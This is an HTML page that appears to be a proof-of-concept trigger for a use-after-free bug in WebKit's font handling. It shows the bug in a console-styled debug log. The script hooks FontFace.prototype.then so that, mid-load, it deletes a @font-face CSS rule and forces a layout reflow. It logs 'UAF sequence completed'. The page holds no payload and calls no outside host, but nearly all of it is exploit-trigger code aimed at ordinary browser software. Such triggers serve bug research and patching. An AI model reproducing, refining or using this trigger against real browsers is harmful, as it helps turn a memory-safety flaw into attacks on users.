<!DOCTYPE html>
<html>
<head>
    <style>
        /* ستايل كونسول احترافي يشبه شاشة النظام */
        body { background: #000; color: #00FF00; font-family: 'Courier New', monospace; padding: 10px; margin: 0; }
        #log-area { width: 100%; height: 95vh; overflow-y: scroll; font-size: 13px; line-height: 1.4; }
        .line { border-bottom: 1px solid #111; margin-bottom: 3px; }
        .timestamp { color: #555; margin-right: 10px; }
    </style>
</head>
<body>
    <div id="log-area"></div>

    <style id="s">
        @font-face { font-family: 'x'; src: local('Arial'); unicode-range: U+0042; }
    </style>

    <script>
        const logArea = document.getElementById('log-area');
        
        function debug(msg) {
            const time = new Date().toLocaleTimeString();
            logArea.innerHTML += `<div class="line"><span class="timestamp">[${time}]</span> ${msg}</div>`;
            logArea.scrollTop = logArea.scrollHeight;
        }

        debug("System Started: Debugging WebKit Memory...");

        window.onload = () => {
            debug("Initialising FontFace object...");
            
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            debug("Hooking FontFace.prototype.then...");
            
            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug("!!! TRAP HIT: then() accessed !!!");
                        
                        try {
                            debug("Executing CSS Rule deletion...");
                            document.getElementById('s').sheet.deleteRule(0);
                            
                            debug("Triggering Layout Reflow...");
                            document.body.offsetTop;
                            
                            debug("UAF sequence completed.");
                        } catch(e) {
                            debug("Error in trap: " + e.message);
                        }
                    }
                    return undefined;
                }
            });

            debug("Starting Font load...");
            try {
                document.fonts.load('1em x', 'AB');
                debug("Load call returned.");
            } catch (e) {
                debug("Exception caught: " + e.message);
            }
        };
    </script>
</body>
</html>
